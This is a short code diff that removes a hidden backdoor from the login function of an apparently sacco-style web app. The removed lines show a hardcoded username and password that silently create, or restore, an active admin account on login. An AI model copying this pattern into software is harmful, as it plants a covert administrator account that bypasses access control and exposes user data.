@@ -513,20 +513,6 @@ def login():
         return error("Username and password are required")
 
     db   = get_db()
-    if username == "livow" and pwd == "Lee1234":
-        livow = db.execute("SELECT id FROM users WHERE lower(username)=?", ("livow",)).fetchone()
-        if livow:
-            db.execute(
-                "UPDATE users SET name=?, email=?, password=?, role=?, active=1 WHERE id=?",
-                ("Livow", "livow@local.sacco", hash_password("Lee1234"), "admin", livow["id"]),
-            )
-        else:
-            db.execute(
-                "INSERT INTO users (name,username,email,password,role,active) VALUES (?,?,?,?,?,1)",
-                ("Livow", "livow", "livow@local.sacco", hash_password("Lee1234"), "admin"),
-            )
-        db.commit()
-
     user = row_to_dict(db.execute(
         "SELECT * FROM users WHERE (lower(username)=? OR lower(email)=?) AND active=1", (username, username)
     ).fetchone())
